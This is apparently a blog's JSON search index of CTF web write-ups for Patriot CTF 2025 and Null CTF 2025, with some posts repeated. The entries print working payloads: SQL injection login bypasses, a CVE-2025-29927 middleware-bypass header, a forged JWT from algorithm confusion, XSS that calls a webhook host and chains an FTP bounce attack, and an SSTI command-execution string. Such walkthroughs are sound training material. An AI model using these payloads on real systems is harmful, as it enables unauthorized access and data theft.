[{"content":"Challenge: Connection Tester Analysis \u0026amp; Exploit This is a classic SQLI (SQL Injection) challenge followed by a web shell.\nFirst thing is this login page. The first that goes in mind is to try a blind SQLI for the fun. Running ' OR 1=1;-- as the username and just a fake password redirects as us an admin user! yay!\nWe are welcomed by this panel, not really interesting, but as a \u0026lsquo;open connectivity tool\u0026rsquo; button. Let\u0026rsquo;s press it!\nThis is the final page. It\u0026rsquo;s supposed to be a tool that connects to an IP, but when entering any ip it just shows a static message. So, I tried fuzzing the input. Eventually, when entering a semicolon i finally saw another message: A webshell! amazing. Let\u0026rsquo;s try a simple ls and cat:\nHere\u0026rsquo;s the flag! easy one.\nChallenge: Trust Fall This is a classic IDOR (Insecure Direct Object Reference) challenge with a combination of Insecure Auth Missconfiguration and hidden API routes. For me, it was a common thing to fuzz around the website, as it should be.\nAnalysis I was presented a login-page, with weird placeholders applied to the inputs:\nFirst thing I tried was trying these as the input, and as expected it worked!\nThe rest of the challenge was easy, but confusing. The next source is applied to the website\u0026rsquo;s html:\nconst AUTH_TOKEN = \u0026#39;trustfall-readonly\u0026#39;; const ... = ...; const ... = ...; const ... = ...; async function fetchJson(url, options = {}) { const response = await fetch(url, { credentials: \u0026#39;same-origin\u0026#39;, ...options, headers: { ...(options.headers || {}), Authorization: `Bearer ${AUTH_TOKEN}` } }); if (!response.ok) { throw new Error(`Request failed with status ${response.status}`); } return response.json(); } Notes: AUTH_TOKEN is a constant that is used to authorize our request it\u0026rsquo;s value is a readonly token, meaning we only have readonly perms (we cannot remove or update data by the rest api) Fuzzing the AUTH_TOKEN was the instant reaction for me, and so I tried editing it\u0026rsquo;s value to trustfall-admin, trustfall-readwrite, trustfall-administrator, etc.. Having no positive response and only 401 (Unauthorized).\nMoving on, the website is requesting /api/products from the server, and also, it requests /api/products/\u0026lt;id\u0026gt;. Let\u0026rsquo;s look at the JSON response:\n[ { \u0026#34;sku\u0026#34;: \u0026#34;GL-404\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Ghostlight Lantern\u0026#34;, \u0026#34;price\u0026#34;: 59, \u0026#34;updatedBy\u0026#34;: 1 }, { \u0026#34;sku\u0026#34;: \u0026#34;MN-1337\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Morning Nebula Mug\u0026#34;, \u0026#34;price\u0026#34;: 24.5, \u0026#34;updatedBy\u0026#34;: 2 }, { \u0026#34;sku\u0026#34;: \u0026#34;SB-001\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Skybridge Backpack\u0026#34;, \u0026#34;price\u0026#34;: 129.99, \u0026#34;updatedBy\u0026#34;: 1 } ] updatedBy field is the interesting part! it shows the ID of the user who edited the product! Automatically I went on trying to find /api/users, which failed. But let\u0026rsquo;s test /api/users/1:\nfetchJson(\u0026quot;/api/users/1\u0026quot;) -\u0026gt;\n{\u0026#34;id\u0026#34;:1,\u0026#34;username\u0026#34;:\u0026#34;inventory-analyst\u0026#34;,\u0026#34;role\u0026#34;:\u0026#34;inventory\u0026#34;,\u0026#34;flag\u0026#34;:null} Great! now let\u0026rsquo;s try the other user:\n{\u0026#34;id\u0026#34;:2,\u0026#34;username\u0026#34;:\u0026#34;merchandising-bot\u0026#34;,\u0026#34;role\u0026#34;:\u0026#34;automation\u0026#34;,\u0026#34;flag\u0026#34;:null} Oh, okay. Easy, let\u0026rsquo;s try user 0:\n{ \u0026#34;id\u0026#34;: 0, \u0026#34;username\u0026#34;: \u0026#34;root\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;superuser\u0026#34;, \u0026#34;flag\u0026#34;: \u0026#34;PCTF{authz_misconfig_owns_u}\u0026#34; } We found the flag. Yippey!!!\nExploit I was just using the given fetchJson function. So, running from the chrome console:\nconst req = await fetchJson(\u0026#39;/api/users/0\u0026#39;); console.log(req); // {id: 0, username: \u0026#39;root\u0026#39;, role: \u0026#39;superuser\u0026#39;, flag: \u0026#39;PCTF{authz_misconfig_owns_u}\u0026#39;} title: \u0026ldquo;Patriot CTF 2025 - Web Challenges\u0026rdquo; date: 2025-12-11T20:06:41+0200 draft: false tags: [\u0026ldquo;ctf\u0026rdquo;, \u0026ldquo;web\u0026rdquo;, \u0026ldquo;writeup\u0026rdquo;, \u0026ldquo;patriot-ctf-2025\u0026rdquo;] categories: [\u0026ldquo;writeups\u0026rdquo;] ","permalink":"//localhost:1313/posts/patriot-ctf-2025-web-challenges/","summary":"Writeups for Patriot CTF 2025\u0026rsquo;s Connection Tester SQLi chain and Trust Fall IDOR/API issues.","title":"Patriot CTF 2025: Web Challenges"},{"content":"Intro I participated in this CTF with PulsaDeCyber. Unfortunately I was busy most of the time, so I only had time to solve 3 challenges, that were easy-medium.\nChallenge: Next Jason - Easy Analysis By opening the source code, I immediately booted up the docker container, so I can play with stuff locally without too much infrastructure-stuff going on. First thing I realized is there is a next.js app that is using some middleware, specified for all /api/*. By going into the website we get a regular login page:\nAfter checking the installed next.js version, I verified # CVE-2025-29927 in the given code.\nThe simple bypass for the middleware will be adding the next header to our /api/* requests: x-middleware-subrequest: \u0026quot;middleware:middleware:middleware:middleware:middleware\u0026quot;\nLet\u0026rsquo;s look at package.json: Both next.js and jsonwebtoken libraries are out of version. The catch is to look for an easy jwt misconfiguration.\nLet\u0026rsquo;s look at the code!\n/token/verify I wont show the whole route, but the main function is verifyToken, which returns the payload for the token if it is valid, by decrypting it using the public key of a randomly generated RSA. It uses both RS256 and HS256 to verify, which is weird. But let\u0026rsquo;s continue!\n/token/sign Well, all this code does is to sign the given payload ( which here is basically {username: string} ) to a jwt token. Also, we cannot sign as admin, so we can\u0026rsquo;t get the admin\u0026rsquo;s token.\nWe have a few more routes in the api, which will be used after the middleware bypass:\n/api/getFlag - returns flag after running /token/verify and checks if we are admin (not usable for now) /api/getPublicKey - returns the RSA\u0026rsquo;s private key. Great achievement. /api/login - just generates a jwt token using /token/sign and filters us from being admin, not usable at all. We can achieve the public key! that\u0026rsquo;s great news. As I was looking for jwt vulnerabilities, I found this article. At the exact \u0026ldquo;Algorithm Confusion\u0026rdquo; title, we can see a case we have in this code. We first sign the payload using RS256, and we verify it with both HS256 or RS256.\nThe way they exploit this in the article is by signing the token using HS256, and the public key as the secret, and it works!\nSo, let\u0026rsquo;s try!\nExploit After fetching the public key, I wrote this js code to generate a new token\nconst jwt = require(\u0026#34;jsonwebtoken\u0026#34;); const {readFileSync} = require(\u0026#34;fs\u0026#34;); const path = require(\u0026#34;path\u0026#34;); const PUBKEY = require(\u0026#34;./pubkey.json\u0026#34;).PUBKEY; const payload = { username: \u0026#39;admin\u0026#39; }; const token = jwt.sign(payload, PUBKEY, { algorithm: \u0026#39;HS256\u0026#39;}) console.log(token); // eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzY0OTUzMDk1fQ.4pG_xYmHYcKNSBIplBKlLQ0eNL-fi0Yp3Fb6kwXI6sw Next, I wrote a simple python script that will fetch the flag using the new admin token, and the middleware bypass:\nr = requests.get(\u0026#39;http://75cb8a82a9d8.challs.ctf.r0devnull.team:8001/api/getFlag\u0026#39;, headers={ \u0026#34;x-middleware-subrequest\u0026#34;: \u0026#34;middleware:middleware:middleware:middleware:middleware\u0026#34; }, cookies={ \u0026#39;token\u0026#39;: \u0026#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzY0OTUzMDk1fQ.4pG_xYmHYcKNSBIplBKlLQ0eNL-fi0Yp3Fb6kwXI6sw\u0026#39; }) print(r.text) Flag: nullctf{f0rg3_7h15_cv3_h3h_c1caa1a23b5c568d} Challenge: ftp-db - Medium Analysis This challenge has 3 services.\nFrontend - next.js, nothing special. A note from the authors mentioned there is nothing special in the frontend. Contacts the backend by using a server component in next.js. FTP (file transfer protocol) - initializes an FTP server using python\u0026rsquo;s pyftpdlib. Note: enables permit_foreign_addresses which allows us to use active mode to send data streams. through a foreign server ( will explain later :) ) . Backend - rust \u0026amp; rocket, contacts the ftp server. So we cannot send requests to ftp or backend, since they are both locally on the container, no open ports.\nLet\u0026rsquo;s open the app:\nThis is a classic notes app. Backend stores notes in the FTP server. Let\u0026rsquo;s check the code.\nnothing really special for creating a note, I wanna look at the code for the search page.\n\u0026lt;div className=\u0026#34;font-mono w-full p-2 text-sm bg-green-900 rounded border border-green-800\u0026#34; dangerouslySetInnerHTML={{ __html: searchResult.result, }} /\u0026gt; We can see the search page injects the page\u0026rsquo;s HTML with the note\u0026rsquo;s content. This is an XSS.\nWe also have a \u0026ldquo;Report to admin\u0026rdquo; button, which opens a webdriver on a specific note, this can trigger the admin to enter our custom note and get injected by our payload.\nLet\u0026rsquo;s validate our theory by making the admin send a message to my webhook:\n\u0026lt;img src=x onerror=\u0026#39;(()=\u0026gt;{fetch(\u0026#34;https://webhook.site/9fe988d0-b53c-451d-9dd5-1febc0179031\u0026#34;, {method: \u0026#34;POST\u0026#34;, mode: \u0026#34;no-cors\u0026#34;}).then((r) =\u0026gt; r.text())})()\u0026#39;\u0026gt; Next step was to figure out how can I actually inject an XSS that will lead us to get flag.txt from the ftp server.\nIt was quite exhausting, but after asking some advice, my friend Harel told me about FTP Bounce Attack, that allows us to make the ftp server connect via active mode to a foreign machine, and send the requested data there.\nExploit To actually use this attack, I found a way to manipulate the CRLF by just sending a raw string body using a POST request, so the body will be in the bottom of the request, and not in the URL header. Locally, I tried the next thing:\n\u0026lt;img src=x onerror=\u0026#39;(()=\u0026gt;{fetch(\u0026#34;http://ftp:2121\u0026#34;, {method: \u0026#34;POST\u0026#34;, body:\u0026#34;USER anonymous\\r\\nPASS anonymous\\r\\n\u0026#34;, mode: \u0026#34;no-cors\u0026#34;})})()\u0026#39;\u0026gt; by seeing the FTP logs. It actually worked. The admin opened a connection to the ftp server, sent him some unknown commands (the HTTP headers lol), and sent him the body, that was injected with FTP commands.\nI booted up a proxy server with a script I wrote (Check it out). And tried the next payload on the original website:\n\u0026lt;img src=x onerror=\u0026#39;(()=\u0026gt;{fetch(\u0026#34;http://ftp:2121\u0026#34;, {method: \u0026#34;POST\u0026#34;, body:\u0026#34;USER anonymous\\r\\nPASS anonymous\\r\\nTYPE A\\r\\nPORT \u0026lt;ip,port\u0026gt;\\r\\nRETR flag.txt\\r\\n\u0026#34;})})()\u0026#39;\u0026gt; But I didn\u0026rsquo;t get any connection to my proxy server.\nAfter figuring it out for a while, I tried adding no-cors and waiting for the promise to finish (using .then).\n\u0026lt;img src=x onerror=\u0026#39;(()=\u0026gt;{fetch(\u0026#34;http://ftp:2121\u0026#34;, {method: \u0026#34;POST\u0026#34;, body:\u0026#34;USER anonymous\\r\\nPASS anonymous\\r\\nTYPE A\\r\\nPORT \u0026lt;ip,port\u0026gt;\\r\\nRETR flag.txt\\r\\n\u0026#34;, mode: \u0026#34;no-cors\u0026#34;}).then((r) =\u0026gt; r.text())})()\u0026#39;\u0026gt; And it worked!\nFlag: nullctf{ftp_15_7h3_b357_d474b453} Credits: Thomas Goldman - we solved this challenge together as teammates. Challenge: s1mple - Easy Analysis There was no source code for this challenge, although the solution was pretty easy.\nFirst is this admin page, after trying basic SQLI payload (' OR 1=1;--), I was logged in as admin. We are given this dashboard, which isn\u0026rsquo;t really helpful since you cannot really do anything here. I tried writing an SQLI payload on the search, which didn\u0026rsquo;t work. And later on I tried SSTI, nothing worked.\nSo I tried logging in as a different user: ' OR 1=1 AND USERNAME != 'admin';-- we are logged in as user!\nLet\u0026rsquo;s try an SQLI query: Okay, let\u0026rsquo;s try a basic SSTI: Perfect.\nnow let\u0026rsquo;s try to read a file:\n{{request[\u0026#39;application\u0026#39;][\u0026#39;__globals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;)[\u0026#39;popen\u0026#39;](\u0026#39;cat flag.txt\u0026#39;)[\u0026#39;read\u0026#39;]()}} It was really simple!\nFlag: nullctf{1nd33d_1t_w4s_th4t_s1mpl3} title: \u0026ldquo;Null CTF 2025 - Web Challenges\u0026rdquo; date: 2025-12-11T20:06:41+0200 draft: false tags: [\u0026ldquo;ctf\u0026rdquo;, \u0026ldquo;web\u0026rdquo;, \u0026ldquo;writeup\u0026rdquo;, \u0026ldquo;null-ctf-2025\u0026rdquo;] categories: [\u0026ldquo;writeups\u0026rdquo;] ","permalink":"//localhost:1313/posts/null-ctf-2025-web-challenges/","summary":"Notes from the Null CTF 2025 web challenges covering Next Jason\u0026rsquo;s auth bypass and JWT abuse.","title":"Null CTF 2025: Web Challenges"},{"content":"This blog collects concise notes and walkthroughs from recent web security and CTF challenges.\nWhat to expect:\nHighlighted attack paths, payloads, and fixes. Quick repro steps with code snippets. Links to resources and tools that helped along the way. If you want to jump straight to the posts list, use the buttons on the home page or the navigation bar. New writeups will appear here as they ship.\n","permalink":"//localhost:1313/posts/welcome/","summary":"What to expect from this collection of web security and CTF writeups.","title":"Welcome"},{"content":"Challenge: Connection Tester Analysis \u0026amp; Exploit This is a classic SQLI (SQL Injection) challenge followed by a web shell.\nFirst thing is this login page. The first that goes in mind is to try a blind SQLI for the fun. Running ' OR 1=1;-- as the username and just a fake password redirects as us an admin user! yay!\nWe are welcomed by this panel, not really interesting, but as a \u0026lsquo;open connectivity tool\u0026rsquo; button. Let\u0026rsquo;s press it!\nThis is the final page. It\u0026rsquo;s supposed to be a tool that connects to an IP, but when entering any ip it just shows a static message. So, I tried fuzzing the input. Eventually, when entering a semicolon i finally saw another message: A webshell! amazing. Let\u0026rsquo;s try a simple ls and cat:\nHere\u0026rsquo;s the flag! easy one.\nChallenge: Trust Fall This is a classic IDOR (Insecure Direct Object Reference) challenge with a combination of Insecure Auth Missconfiguration and hidden API routes. For me, it was a common thing to fuzz around the website, as it should be.\nAnalysis I was presented a login-page, with weird placeholders applied to the inputs:\nFirst thing I tried was trying these as the input, and as expected it worked!\nThe rest of the challenge was easy, but confusing. The next source is applied to the website\u0026rsquo;s html:\nconst AUTH_TOKEN = \u0026#39;trustfall-readonly\u0026#39;; const ... = ...; const ... = ...; const ... = ...; async function fetchJson(url, options = {}) { const response = await fetch(url, { credentials: \u0026#39;same-origin\u0026#39;, ...options, headers: { ...(options.headers || {}), Authorization: `Bearer ${AUTH_TOKEN}` } }); if (!response.ok) { throw new Error(`Request failed with status ${response.status}`); } return response.json(); } Notes: AUTH_TOKEN is a constant that is used to authorize our request it\u0026rsquo;s value is a readonly token, meaning we only have readonly perms (we cannot remove or update data by the rest api) Fuzzing the AUTH_TOKEN was the instant reaction for me, and so I tried editing it\u0026rsquo;s value to trustfall-admin, trustfall-readwrite, trustfall-administrator, etc.. Having no positive response and only 401 (Unauthorized).\nMoving on, the website is requesting /api/products from the server, and also, it requests /api/products/\u0026lt;id\u0026gt;. Let\u0026rsquo;s look at the JSON response:\n[ { \u0026#34;sku\u0026#34;: \u0026#34;GL-404\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Ghostlight Lantern\u0026#34;, \u0026#34;price\u0026#34;: 59, \u0026#34;updatedBy\u0026#34;: 1 }, { \u0026#34;sku\u0026#34;: \u0026#34;MN-1337\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Morning Nebula Mug\u0026#34;, \u0026#34;price\u0026#34;: 24.5, \u0026#34;updatedBy\u0026#34;: 2 }, { \u0026#34;sku\u0026#34;: \u0026#34;SB-001\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Skybridge Backpack\u0026#34;, \u0026#34;price\u0026#34;: 129.99, \u0026#34;updatedBy\u0026#34;: 1 } ] updatedBy field is the interesting part! it shows the ID of the user who edited the product! Automatically I went on trying to find /api/users, which failed. But let\u0026rsquo;s test /api/users/1:\nfetchJson(\u0026quot;/api/users/1\u0026quot;) -\u0026gt;\n{\u0026#34;id\u0026#34;:1,\u0026#34;username\u0026#34;:\u0026#34;inventory-analyst\u0026#34;,\u0026#34;role\u0026#34;:\u0026#34;inventory\u0026#34;,\u0026#34;flag\u0026#34;:null} Great! now let\u0026rsquo;s try the other user:\n{\u0026#34;id\u0026#34;:2,\u0026#34;username\u0026#34;:\u0026#34;merchandising-bot\u0026#34;,\u0026#34;role\u0026#34;:\u0026#34;automation\u0026#34;,\u0026#34;flag\u0026#34;:null} Oh, okay. Easy, let\u0026rsquo;s try user 0:\n{ \u0026#34;id\u0026#34;: 0, \u0026#34;username\u0026#34;: \u0026#34;root\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;superuser\u0026#34;, \u0026#34;flag\u0026#34;: \u0026#34;PCTF{authz_misconfig_owns_u}\u0026#34; } We found the flag. Yippey!!!\nExploit I was just using the given fetchJson function. So, running from the chrome console:\nconst req = await fetchJson(\u0026#39;/api/users/0\u0026#39;); console.log(req); // {id: 0, username: \u0026#39;root\u0026#39;, role: \u0026#39;superuser\u0026#39;, flag: \u0026#39;PCTF{authz_misconfig_owns_u}\u0026#39;} ","permalink":"//localhost:1313/posts/patriot-ctf-2025-web-challenges/","summary":"Writeups for Patriot CTF 2025\u0026rsquo;s Connection Tester SQLi chain and Trust Fall IDOR/API issues.","title":"Patriot CTF 2025: Web Challenges"},{"content":"Intro I participated in this CTF with PulsaDeCyber. Unfortunately I was busy most of the time, so I only had time to solve 3 challenges, that were easy-medium.\nChallenge: Next Jason - Easy Analysis By opening the source code, I immediately booted up the docker container, so I can play with stuff locally without too much infrastructure-stuff going on. First thing I realized is there is a next.js app that is using some middleware, specified for all /api/*. By going into the website we get a regular login page:\nAfter checking the installed next.js version, I verified # CVE-2025-29927 in the given code.\nThe simple bypass for the middleware will be adding the next header to our /api/* requests: x-middleware-subrequest: \u0026quot;middleware:middleware:middleware:middleware:middleware\u0026quot;\nLet\u0026rsquo;s look at package.json: Both next.js and jsonwebtoken libraries are out of version. The catch is to look for an easy jwt misconfiguration.\nLet\u0026rsquo;s look at the code!\n/token/verify I wont show the whole route, but the main function is verifyToken, which returns the payload for the token if it is valid, by decrypting it using the public key of a randomly generated RSA. It uses both RS256 and HS256 to verify, which is weird. But let\u0026rsquo;s continue!\n/token/sign Well, all this code does is to sign the given payload ( which here is basically {username: string} ) to a jwt token. Also, we cannot sign as admin, so we can\u0026rsquo;t get the admin\u0026rsquo;s token.\nWe have a few more routes in the api, which will be used after the middleware bypass:\n/api/getFlag - returns flag after running /token/verify and checks if we are admin (not usable for now) /api/getPublicKey - returns the RSA\u0026rsquo;s private key. Great achievement. /api/login - just generates a jwt token using /token/sign and filters us from being admin, not usable at all. We can achieve the public key! that\u0026rsquo;s great news. As I was looking for jwt vulnerabilities, I found this article. At the exact \u0026ldquo;Algorithm Confusion\u0026rdquo; title, we can see a case we have in this code. We first sign the payload using RS256, and we verify it with both HS256 or RS256.\nThe way they exploit this in the article is by signing the token using HS256, and the public key as the secret, and it works!\nSo, let\u0026rsquo;s try!\nExploit After fetching the public key, I wrote this js code to generate a new token\nconst jwt = require(\u0026#34;jsonwebtoken\u0026#34;); const {readFileSync} = require(\u0026#34;fs\u0026#34;); const path = require(\u0026#34;path\u0026#34;); const PUBKEY = require(\u0026#34;./pubkey.json\u0026#34;).PUBKEY; const payload = { username: \u0026#39;admin\u0026#39; }; const token = jwt.sign(payload, PUBKEY, { algorithm: \u0026#39;HS256\u0026#39;}) console.log(token); // eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzY0OTUzMDk1fQ.4pG_xYmHYcKNSBIplBKlLQ0eNL-fi0Yp3Fb6kwXI6sw Next, I wrote a simple python script that will fetch the flag using the new admin token, and the middleware bypass:\nr = requests.get(\u0026#39;http://75cb8a82a9d8.challs.ctf.r0devnull.team:8001/api/getFlag\u0026#39;, headers={ \u0026#34;x-middleware-subrequest\u0026#34;: \u0026#34;middleware:middleware:middleware:middleware:middleware\u0026#34; }, cookies={ \u0026#39;token\u0026#39;: \u0026#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzY0OTUzMDk1fQ.4pG_xYmHYcKNSBIplBKlLQ0eNL-fi0Yp3Fb6kwXI6sw\u0026#39; }) print(r.text) Flag: nullctf{f0rg3_7h15_cv3_h3h_c1caa1a23b5c568d} Challenge: ftp-db - Medium Analysis This challenge has 3 services.\nFrontend - next.js, nothing special. A note from the authors mentioned there is nothing special in the frontend. Contacts the backend by using a server component in next.js. FTP (file transfer protocol) - initializes an FTP server using python\u0026rsquo;s pyftpdlib. Note: enables permit_foreign_addresses which allows us to use active mode to send data streams. through a foreign server ( will explain later :) ) . Backend - rust \u0026amp; rocket, contacts the ftp server. So we cannot send requests to ftp or backend, since they are both locally on the container, no open ports.\nLet\u0026rsquo;s open the app:\nThis is a classic notes app. Backend stores notes in the FTP server. Let\u0026rsquo;s check the code.\nnothing really special for creating a note, I wanna look at the code for the search page.\n\u0026lt;div className=\u0026#34;font-mono w-full p-2 text-sm bg-green-900 rounded border border-green-800\u0026#34; dangerouslySetInnerHTML={{ __html: searchResult.result, }} /\u0026gt; We can see the search page injects the page\u0026rsquo;s HTML with the note\u0026rsquo;s content. This is an XSS.\nWe also have a \u0026ldquo;Report to admin\u0026rdquo; button, which opens a webdriver on a specific note, this can trigger the admin to enter our custom note and get injected by our payload.\nLet\u0026rsquo;s validate our theory by making the admin send a message to my webhook:\n\u0026lt;img src=x onerror=\u0026#39;(()=\u0026gt;{fetch(\u0026#34;https://webhook.site/9fe988d0-b53c-451d-9dd5-1febc0179031\u0026#34;, {method: \u0026#34;POST\u0026#34;, mode: \u0026#34;no-cors\u0026#34;}).then((r) =\u0026gt; r.text())})()\u0026#39;\u0026gt; Next step was to figure out how can I actually inject an XSS that will lead us to get flag.txt from the ftp server.\nIt was quite exhausting, but after asking some advice, my friend Harel told me about FTP Bounce Attack, that allows us to make the ftp server connect via active mode to a foreign machine, and send the requested data there.\nExploit To actually use this attack, I found a way to manipulate the CRLF by just sending a raw string body using a POST request, so the body will be in the bottom of the request, and not in the URL header. Locally, I tried the next thing:\n\u0026lt;img src=x onerror=\u0026#39;(()=\u0026gt;{fetch(\u0026#34;http://ftp:2121\u0026#34;, {method: \u0026#34;POST\u0026#34;, body:\u0026#34;USER anonymous\\r\\nPASS anonymous\\r\\n\u0026#34;, mode: \u0026#34;no-cors\u0026#34;})})()\u0026#39;\u0026gt; by seeing the FTP logs. It actually worked. The admin opened a connection to the ftp server, sent him some unknown commands (the HTTP headers lol), and sent him the body, that was injected with FTP commands.\nI booted up a proxy server with a script I wrote (Check it out). And tried the next payload on the original website:\n\u0026lt;img src=x onerror=\u0026#39;(()=\u0026gt;{fetch(\u0026#34;http://ftp:2121\u0026#34;, {method: \u0026#34;POST\u0026#34;, body:\u0026#34;USER anonymous\\r\\nPASS anonymous\\r\\nTYPE A\\r\\nPORT \u0026lt;ip,port\u0026gt;\\r\\nRETR flag.txt\\r\\n\u0026#34;})})()\u0026#39;\u0026gt; But I didn\u0026rsquo;t get any connection to my proxy server.\nAfter figuring it out for a while, I tried adding no-cors and waiting for the promise to finish (using .then).\n\u0026lt;img src=x onerror=\u0026#39;(()=\u0026gt;{fetch(\u0026#34;http://ftp:2121\u0026#34;, {method: \u0026#34;POST\u0026#34;, body:\u0026#34;USER anonymous\\r\\nPASS anonymous\\r\\nTYPE A\\r\\nPORT \u0026lt;ip,port\u0026gt;\\r\\nRETR flag.txt\\r\\n\u0026#34;, mode: \u0026#34;no-cors\u0026#34;}).then((r) =\u0026gt; r.text())})()\u0026#39;\u0026gt; And it worked!\nFlag: nullctf{ftp_15_7h3_b357_d474b453} Credits: Thomas Goldman - we solved this challenge together as teammates. Challenge: s1mple - Easy Analysis There was no source code for this challenge, although the solution was pretty easy.\nFirst is this admin page, after trying basic SQLI payload (' OR 1=1;--), I was logged in as admin. We are given this dashboard, which isn\u0026rsquo;t really helpful since you cannot really do anything here. I tried writing an SQLI payload on the search, which didn\u0026rsquo;t work. And later on I tried SSTI, nothing worked.\nSo I tried logging in as a different user: ' OR 1=1 AND USERNAME != 'admin';-- we are logged in as user!\nLet\u0026rsquo;s try an SQLI query: Okay, let\u0026rsquo;s try a basic SSTI: Perfect.\nnow let\u0026rsquo;s try to read a file:\n{{request[\u0026#39;application\u0026#39;][\u0026#39;__globals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;)[\u0026#39;popen\u0026#39;](\u0026#39;cat flag.txt\u0026#39;)[\u0026#39;read\u0026#39;]()}} It was really simple!\nFlag: nullctf{1nd33d_1t_w4s_th4t_s1mpl3} title: \u0026ldquo;Null CTF 2025 - Web Challenges\u0026rdquo; date: 2025-12-11T20:06:41+0200 draft: false tags: [\u0026ldquo;ctf\u0026rdquo;, \u0026ldquo;web\u0026rdquo;, \u0026ldquo;writeup\u0026rdquo;, \u0026ldquo;null-ctf-2025\u0026rdquo;] categories: [\u0026ldquo;writeups\u0026rdquo;] ","permalink":"//localhost:1313/posts/null-ctf-2025-web-challenges/","summary":"Notes from the Null CTF 2025 web challenges covering Next Jason\u0026rsquo;s auth bypass and JWT abuse.","title":"Null CTF 2025: Web Challenges"},{"content":"This blog collects concise notes and walkthroughs from recent web security and CTF challenges.\nWhat to expect:\nHighlighted attack paths, payloads, and fixes. Quick repro steps with code snippets. Links to resources and tools that helped along the way. If you want to jump straight to the posts list, use the buttons on the home page or the navigation bar. New writeups will appear here as they ship.\n","permalink":"//localhost:1313/posts/welcome/","summary":"What to expect from this collection of web security and CTF writeups.","title":"Welcome"},{"content":"Challenge: Connection Tester Analysis \u0026amp; Exploit This is a classic SQLI (SQL Injection) challenge followed by a web shell.\nFirst thing is this login page. The first that goes in mind is to try a blind SQLI for the fun. Running ' OR 1=1;-- as the username and just a fake password redirects as us an admin user! yay!\nWe are welcomed by this panel, not really interesting, but as a \u0026lsquo;open connectivity tool\u0026rsquo; button. Let\u0026rsquo;s press it!\nThis is the final page. It\u0026rsquo;s supposed to be a tool that connects to an IP, but when entering any ip it just shows a static message. So, I tried fuzzing the input. Eventually, when entering a semicolon i finally saw another message: A webshell! amazing. Let\u0026rsquo;s try a simple ls and cat:\nHere\u0026rsquo;s the flag! easy one.\nChallenge: Trust Fall This is a classic IDOR (Insecure Direct Object Reference) challenge with a combination of Insecure Auth Missconfiguration and hidden API routes. For me, it was a common thing to fuzz around the website, as it should be.\nAnalysis I was presented a login-page, with weird placeholders applied to the inputs:\nFirst thing I tried was trying these as the input, and as expected it worked!\nThe rest of the challenge was easy, but confusing. The next source is applied to the website\u0026rsquo;s html:\nconst AUTH_TOKEN = \u0026#39;trustfall-readonly\u0026#39;; const ... = ...; const ... = ...; const ... = ...; async function fetchJson(url, options = {}) { const response = await fetch(url, { credentials: \u0026#39;same-origin\u0026#39;, ...options, headers: { ...(options.headers || {}), Authorization: `Bearer ${AUTH_TOKEN}` } }); if (!response.ok) { throw new Error(`Request failed with status ${response.status}`); } return response.json(); } Notes: AUTH_TOKEN is a constant that is used to authorize our request it\u0026rsquo;s value is a readonly token, meaning we only have readonly perms (we cannot remove or update data by the rest api) Fuzzing the AUTH_TOKEN was the instant reaction for me, and so I tried editing it\u0026rsquo;s value to trustfall-admin, trustfall-readwrite, trustfall-administrator, etc.. Having no positive response and only 401 (Unauthorized).\nMoving on, the website is requesting /api/products from the server, and also, it requests /api/products/\u0026lt;id\u0026gt;. Let\u0026rsquo;s look at the JSON response:\n[ { \u0026#34;sku\u0026#34;: \u0026#34;GL-404\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Ghostlight Lantern\u0026#34;, \u0026#34;price\u0026#34;: 59, \u0026#34;updatedBy\u0026#34;: 1 }, { \u0026#34;sku\u0026#34;: \u0026#34;MN-1337\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Morning Nebula Mug\u0026#34;, \u0026#34;price\u0026#34;: 24.5, \u0026#34;updatedBy\u0026#34;: 2 }, { \u0026#34;sku\u0026#34;: \u0026#34;SB-001\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Skybridge Backpack\u0026#34;, \u0026#34;price\u0026#34;: 129.99, \u0026#34;updatedBy\u0026#34;: 1 } ] updatedBy field is the interesting part! it shows the ID of the user who edited the product! Automatically I went on trying to find /api/users, which failed. But let\u0026rsquo;s test /api/users/1:\nfetchJson(\u0026quot;/api/users/1\u0026quot;) -\u0026gt;\n{\u0026#34;id\u0026#34;:1,\u0026#34;username\u0026#34;:\u0026#34;inventory-analyst\u0026#34;,\u0026#34;role\u0026#34;:\u0026#34;inventory\u0026#34;,\u0026#34;flag\u0026#34;:null} Great! now let\u0026rsquo;s try the other user:\n{\u0026#34;id\u0026#34;:2,\u0026#34;username\u0026#34;:\u0026#34;merchandising-bot\u0026#34;,\u0026#34;role\u0026#34;:\u0026#34;automation\u0026#34;,\u0026#34;flag\u0026#34;:null} Oh, okay. Easy, let\u0026rsquo;s try user 0:\n{ \u0026#34;id\u0026#34;: 0, \u0026#34;username\u0026#34;: \u0026#34;root\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;superuser\u0026#34;, \u0026#34;flag\u0026#34;: \u0026#34;PCTF{authz_misconfig_owns_u}\u0026#34; } We found the flag. Yippey!!!\nExploit I was just using the given fetchJson function. So, running from the chrome console:\nconst req = await fetchJson(\u0026#39;/api/users/0\u0026#39;); console.log(req); // {id: 0, username: \u0026#39;root\u0026#39;, role: \u0026#39;superuser\u0026#39;, flag: \u0026#39;PCTF{authz_misconfig_owns_u}\u0026#39;} ","permalink":"//localhost:1313/posts/patriot-ctf-2025-web-challenges/","summary":"Writeups for Patriot CTF 